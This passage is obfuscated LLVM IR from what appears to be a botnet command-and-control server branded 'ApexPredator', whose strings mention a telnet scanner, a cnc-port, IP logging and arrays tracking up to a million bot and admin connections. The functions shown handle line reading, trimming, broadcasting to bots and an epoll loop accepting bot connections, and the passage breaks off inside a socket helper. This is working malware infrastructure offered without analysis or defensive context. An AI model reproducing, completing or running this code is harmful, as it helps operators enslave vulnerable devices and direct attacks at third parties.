@.str.197 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STARTED\0D\0A\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"!* SCANNER OFF\00", align 1
@.str.199 = private unnamed_addr constant [25 x i8] c"TELNET SCANNER STOPPED\0D\0A\00", align 1
@.str.200 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.201 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.202 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.203 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.204 = private unnamed_addr constant [5 x i8] c"EXIT\00", align 1
@.str.205 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.206 = private unnamed_addr constant [97 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] - Command:\1B[1;37m[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.207 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.208 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Screening Error\00", align 1
@.str.209 = private unnamed_addr constant [62 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From \00", align 1
@.str.210 = private unnamed_addr constant [7 x i8] c"IP.log\00", align 1
@.str.211 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Incoming Connection From [\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.212 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.213 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.214 = private unnamed_addr constant [87 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Thread Limit Exceeded! Please Lower Threat Count!\0A\00", align 1
@.str.215 = private unnamed_addr constant [111 x i8] c"\1B[1;31m\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Successfully Screened - Created By [\1B[0;36mFlexingOnLamers\1B[1;37m]\0A\00", align 1
@.str.216 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.217 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.218 = private unnamed_addr constant [7 x i8] c"STRING\00", align 1
@.str.220 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.221 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.222 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %7, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %8, align 4
  ret i32 %42
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 5024372900032781816
  %9 = sub i64 %8, 1
  %10 = add i64 %9, 5024372900032781816
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #8
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %4, align 4
  br label %13

; <label>:29:                                     ; preds = %13
  br label %30

; <label>:30:                                     ; preds = %45, %29
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  br i1 %33, label %34, label %43

; <label>:34:                                     ; preds = %30
  %35 = load i8*, i8** %2, align 8
  %36 = load i32, i32* %5, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds i8, i8* %35, i64 %37
  %39 = load i8, i8* %38, align 1
  %40 = sext i8 %39 to i32
  %41 = call i32 @isspace(i32 %40) #8
  %42 = icmp ne i32 %41, 0
  br label %43

; <label>:43:                                     ; preds = %34, %30
  %44 = phi i1 [ false, %30 ], [ %42, %34 ]
  br i1 %44, label %45, label %50

; <label>:45:                                     ; preds = %43
  %46 = load i32, i32* %5, align 4
  %47 = sub i32 0, -1
  %48 = sub i32 %46, %47
  %49 = add nsw i32 %46, -1
  store i32 %48, i32* %5, align 4
  br label %30

; <label>:50:                                     ; preds = %43
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %71, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %78

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = add i32 %63, 492958073
  %66 = sub i32 %65, %64
  %67 = sub i32 %66, 492958073
  %68 = sub nsw i32 %63, %64
  %69 = sext i32 %67 to i64
  %70 = getelementptr inbounds i8, i8* %62, i64 %69
  store i8 %61, i8* %70, align 1
  br label %71

; <label>:71:                                     ; preds = %56
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 1
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 1
  store i32 %76, i32* %3, align 4
  br label %52

; <label>:78:                                     ; preds = %52
  %79 = load i8*, i8** %2, align 8
  %80 = load i32, i32* %3, align 4
  %81 = load i32, i32* %4, align 4
  %82 = add i32 %80, -1919884038
  %83 = sub i32 %82, %81
  %84 = sub i32 %83, -1919884038
  %85 = sub nsw i32 %80, %81
  %86 = sext i32 %84 to i64
  %87 = getelementptr inbounds i8, i8* %79, i64 %86
  store i8 0, i8* %87, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

; <label>:17:                                     ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 5272087144572194555
  %21 = add i64 %20, 10
  %22 = sub i64 %21, 5272087144572194555
  %23 = add i64 %19, 10
  %24 = call noalias i8* @malloc(i64 %22) #7
  store i8* %24, i8** %8, align 8
  %25 = load i8*, i8** %8, align 8
  %26 = load i8*, i8** %4, align 8
  %27 = call i64 @strlen(i8* %26) #8
  %28 = sub i64 0, %27
  %29 = sub i64 0, 10
  %30 = add i64 %28, %29
  %31 = sub i64 0, %30
  %32 = add i64 %27, 10
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 %31, i32 1, i1 false)
  %33 = load i8*, i8** %8, align 8
  %34 = load i8*, i8** %4, align 8
  %35 = call i8* @strcpy(i8* %33, i8* %34) #7
  %36 = load i8*, i8** %8, align 8
  call void @trim(i8* %36)
  %37 = call i64 @time(i64* %9) #7
  %38 = call %struct.tm* @localtime(i64* %9) #7
  store %struct.tm* %38, %struct.tm** %10, align 8
  %39 = load %struct.tm*, %struct.tm** %10, align 8
  %40 = call i8* @asctime(%struct.tm* %39) #7
  store i8* %40, i8** %11, align 8
  %41 = load i8*, i8** %11, align 8
  call void @trim(i8* %41)
  store i32 0, i32* %12, align 4
  br label %42

; <label>:42:                                     ; preds = %68, %17
  %43 = load i32, i32* %12, align 4
  %44 = icmp slt i32 %43, 1000000
  br i1 %44, label %45, label %75

; <label>:45:                                     ; preds = %42
  %46 = load i32, i32* %12, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp eq i32 %46, %47
  br i1 %48, label %66, label %49

; <label>:49:                                     ; preds = %45
  %50 = load i32, i32* %12, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %51
  %53 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %52, i32 0, i32 2
  %54 = load i8, i8* %53, align 1
  %55 = icmp ne i8 %54, 0
  br i1 %55, label %67, label %56

; <label>:56:                                     ; preds = %49
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %66, label %59

; <label>:59:                                     ; preds = %56
  %60 = load i32, i32* %12, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %61
  %63 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %62, i32 0, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %67, label %66

; <label>:66:                                     ; preds = %59, %56, %45
  br label %68

; <label>:67:                                     ; preds = %59, %49
  br label %68

; <label>:68:                                     ; preds = %67, %66
  %69 = load i32, i32* %12, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, 1
  store i32 %73, i32* %12, align 4
  br label %42

; <label>:75:                                     ; preds = %42
  %76 = load i8*, i8** %8, align 8
  call void @free(i8* %76) #7
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define i8* @epollEventLoop(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca %struct.epoll_event, align 1
  %5 = alloca %struct.epoll_event*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr, align 2
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  store i8* %0, i8** %3, align 8
  %18 = call noalias i8* @calloc(i64 1000000, i64 12) #7
  %19 = bitcast i8* %18 to %struct.epoll_event*
  store %struct.epoll_event* %19, %struct.epoll_event** %5, align 8
  br label %20

; <label>:20:                                     ; preds = %232, %1
  %21 = load volatile i32, i32* @epollFD, align 4
  %22 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %23 = call i32 @epoll_wait(i32 %21, %struct.epoll_event* %22, i32 1000000, i32 -1)
  store i32 %23, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %24

; <label>:24:                                     ; preds = %226, %20
  %25 = load i32, i32* %8, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp slt i32 %25, %26
  br i1 %27, label %28, label %232

; <label>:28:                                     ; preds = %24
  %29 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %29, i64 %31
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i32 0, i32 0
  %34 = load i32, i32* %33, align 1
  %35 = xor i32 %34, -1
  %36 = xor i32 8, -1
  %37 = xor i32 1030427901, -1
  %38 = or i32 %35, %36
  %39 = or i32 1030427901, %37
  %40 = xor i32 %38, -1
  %41 = and i32 %40, %39
  %42 = and i32 %34, 8
  %43 = icmp ne i32 %41, 0
  br i1 %43, label %68, label %44

; <label>:44:                                     ; preds = %28
  %45 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i64 %47
  %49 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %48, i32 0, i32 0
  %50 = load i32, i32* %49, align 1
  %51 = xor i32 16, -1
  %52 = xor i32 %50, %51
  %53 = and i32 %52, %50
  %54 = and i32 %50, 16
  %55 = icmp ne i32 %53, 0
  br i1 %55, label %68, label %56

; <label>:56:                                     ; preds = %44
  %57 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %57, i64 %59
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i32 0, i32 0
  %62 = load i32, i32* %61, align 1
  %63 = xor i32 1, -1
  %64 = xor i32 %62, %63
  %65 = and i32 %64, %62
  %66 = and i32 %62, 1
  %67 = icmp ne i32 %65, 0
  br i1 %67, label %87, label %68

; <label>:68:                                     ; preds = %56, %44, %28
  %69 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %76
  %78 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %77, i32 0, i32 2
  store i8 0, i8* %78, align 1
  %79 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %80 = load i32, i32* %8, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = call i32 @close(i32 %85)
  br label %226

; <label>:87:                                     ; preds = %56
  %88 = load volatile i32, i32* @listenFD, align 4
  %89 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %90 = load i32, i32* %8, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %89, i64 %91
  %93 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %92, i32 0, i32 1
  %94 = bitcast %union.epoll_data* %93 to i32*
  %95 = load i32, i32* %94, align 1
  %96 = icmp eq i32 %88, %95
  br i1 %96, label %97, label %150

; <label>:97:                                     ; preds = %87
  br label %98

; <label>:98:                                     ; preds = %142, %97
  store i32 16, i32* %10, align 4
  %99 = load volatile i32, i32* @listenFD, align 4
  %100 = call i32 @accept(i32 %99, %struct.sockaddr* %9, i32* %10)
  store i32 %100, i32* %11, align 4
  %101 = load i32, i32* %11, align 4
  %102 = icmp eq i32 %101, -1
  br i1 %102, label %103, label %113

; <label>:103:                                    ; preds = %98
  %104 = call i32* @__errno_location() #9
  %105 = load i32, i32* %104, align 4
  %106 = icmp eq i32 %105, 11
  br i1 %106, label %111, label %107

; <label>:107:                                    ; preds = %103
  %108 = call i32* @__errno_location() #9
  %109 = load i32, i32* %108, align 4
  %110 = icmp eq i32 %109, 11
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %107, %103
  br label %149

; <label>:112:                                    ; preds = %107
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))
  br label %149

; <label>:113:                                    ; preds = %98
  %114 = bitcast %struct.sockaddr* %9 to %struct.sockaddr_in*
  %115 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %114, i32 0, i32 2
  %116 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 2
  %118 = load i32, i32* %11, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %119
  %121 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %120, i32 0, i32 0
  store i32 %117, i32* %121, align 4
  %122 = load i32, i32* %11, align 4
  %123 = call i32 @make_socket_non_blocking(i32 %122)
  store i32 %123, i32* %6, align 4
  %124 = load i32, i32* %6, align 4
  %125 = icmp eq i32 %124, -1
  br i1 %125, label %126, label %129

; <label>:126:                                    ; preds = %113
  %127 = load i32, i32* %11, align 4
  %128 = call i32 @close(i32 %127)
  br label %149

; <label>:129:                                    ; preds = %113
  %130 = load i32, i32* %11, align 4
  %131 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 1
  %132 = bitcast %union.epoll_data* %131 to i32*
  store i32 %130, i32* %132, align 1
  %133 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i32 0, i32 0
  store i32 -2147483647, i32* %133, align 1
  %134 = load volatile i32, i32* @epollFD, align 4
  %135 = load i32, i32* %11, align 4
  %136 = call i32 @epoll_ctl(i32 %134, i32 1, i32 %135, %struct.epoll_event* %4) #7
  store i32 %136, i32* %6, align 4
  %137 = load i32, i32* %6, align 4
  %138 = icmp eq i32 %137, -1
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %129
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i32 0, i32 0))
  %140 = load i32, i32* %11, align 4
  %141 = call i32 @close(i32 %140)
  br label %149

; <label>:142:                                    ; preds = %129
  %143 = load i32, i32* %11, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %144
  %146 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %145, i32 0, i32 2
  store i8 1, i8* %146, align 1
  %147 = load i32, i32* %11, align 4
  %148 = call i64 @send(i32 %147, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i32 0, i32 0), i64 14, i32 16384)
  br label %98

; <label>:149:                                    ; preds = %139, %126, %112, %111
  br label %226

; <label>:150:                                    ; preds = %87
  %151 = load %struct.epoll_event*, %struct.epoll_event** %5, align 8
  %152 = load i32, i32* %8, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %151, i64 %153
  %155 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %154, i32 0, i32 1
  %156 = bitcast %union.epoll_data* %155 to i32*
  %157 = load i32, i32* %156, align 1
  store i32 %157, i32* %13, align 4
  %158 = load i32, i32* %13, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %159
  store %struct.clientdata_t* %160, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %161 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %162 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %161, i32 0, i32 2
  store i8 1, i8* %162, align 1
  br label %163

; <label>:163:                                    ; preds = %214, %150
  %164 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %164, i8 0, i64 2048, i32 16, i1 false)
  br label %165

; <label>:165:                                    ; preds = %197, %196, %191, %163
  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 2048, i32 16, i1 false)
  %167 = icmp ne i8* %166, null
  br i1 %167, label %168, label %174

; <label>:168:                                    ; preds = %165
  %169 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %170 = load i32, i32* %13, align 4
  %171 = call i32 @fdgets(i8* %169, i32 2048, i32 %170)
  %172 = sext i32 %171 to i64
  store i64 %172, i64* %16, align 8
  %173 = icmp sgt i64 %172, 0
  br label %174

; <label>:174:                                    ; preds = %168, %165
  %175 = phi i1 [ false, %165 ], [ %173, %168 ]
  br i1 %175, label %176, label %200

; <label>:176:                                    ; preds = %174
  %177 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %178 = call i8* @strstr(i8* %177, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0)) #8
  %179 = icmp eq i8* %178, null
  br i1 %179, label %180, label %181

; <label>:180:                                    ; preds = %176
  store i32 1, i32* %15, align 4
  br label %200

; <label>:181:                                    ; preds = %176
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  call void @trim(i8* %182)
  %183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %184 = call i32 @strcmp(i8* %183, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  %185 = icmp eq i32 %184, 0
  br i1 %185, label %186, label %192

; <label>:186:                                    ; preds = %181
  %187 = load i32, i32* %13, align 4
  %188 = call i64 @send(i32 %187, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.5, i32 0, i32 0), i64 5, i32 16384)
  %189 = icmp eq i64 %188, -1
  br i1 %189, label %190, label %191

; <label>:190:                                    ; preds = %186
  store i32 1, i32* %15, align 4
  br label %200

; <label>:191:                                    ; preds = %186
  br label %165

; <label>:192:                                    ; preds = %181
  %193 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %194 = call i32 @strcmp(i8* %193, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0)) #8
  %195 = icmp eq i32 %194, 0
  br i1 %195, label %196, label %197

; <label>:196:                                    ; preds = %192
  br label %165

; <label>:197:                                    ; preds = %192
  %198 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %199 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* %198)
  br label %165

; <label>:200:                                    ; preds = %190, %180, %174
  %201 = load i64, i64* %16, align 8
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %209

; <label>:203:                                    ; preds = %200
  %204 = call i32* @__errno_location() #9
  %205 = load i32, i32* %204, align 4
  %206 = icmp ne i32 %205, 11
  br i1 %206, label %207, label %208

; <label>:207:                                    ; preds = %203
  store i32 1, i32* %15, align 4
  br label %208

; <label>:208:                                    ; preds = %207, %203
  br label %215

; <label>:209:                                    ; preds = %200
  %210 = load i64, i64* %16, align 8
  %211 = icmp eq i64 %210, 0
  br i1 %211, label %212, label %213

; <label>:212:                                    ; preds = %209
  store i32 1, i32* %15, align 4
  br label %215

; <label>:213:                                    ; preds = %209
  br label %214

; <label>:214:                                    ; preds = %213
  br label %163

; <label>:215:                                    ; preds = %212, %208
  %216 = load i32, i32* %15, align 4
  %217 = icmp ne i32 %216, 0
  br i1 %217, label %218, label %223

; <label>:218:                                    ; preds = %215
  %219 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %220 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %219, i32 0, i32 2
  store i8 0, i8* %220, align 1
  %221 = load i32, i32* %13, align 4
  %222 = call i32 @close(i32 %221)
  br label %223

; <label>:223:                                    ; preds = %218, %215
  br label %224

; <label>:224:                                    ; preds = %223
  br label %225

; <label>:225:                                    ; preds = %224
  br label %226

; <label>:226:                                    ; preds = %225, %149, %68
  %227 = load i32, i32* %8, align 4
  %228 = add i32 %227, -1955250789
  %229 = add i32 %228, 1
  %230 = sub i32 %229, -1955250789
  %231 = add nsw i32 %227, 1
  store i32 %230, i32* %8, align 4
  br label %24

; <label>:232:                                    ; preds = %24
  br label %20
                                                  ; No predecessors!
  %234 = load i8*, i8** %2, align 8
  ret i8* %234
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal i32 @make_socket_non_blocking(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

; <label>:10:                                     ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.219, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  br label %36

; <label>:11:                                     ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 2048, -1
  %15 = xor i32 -1433600479, -1
  %16 = and i32 %13, -1433600479
  %17 = and i32 %12, %15
  %18 = and i32 %14, -1433600479
  %19 = and i32 2048, %15
  %20 = or i32 %16, %17
  %21 = or i32 %18, %19
  %22 = xor i32 %20, %21
  %23 = or i32 %13, %14
  %24 = xor i32 %23, -1
  %25 = or i32 -1433600479, %15
  %26 = and i32 %24, %25
  %27 = or i32 %22, %26
  %28 = or i32 %12, 2048
  store i32 %27, i32* %4, align 4
  %29 = load i32, i32* %3, align 4
  %30 = load i32, i32* %4, align 4
  %31 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %30)
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %11
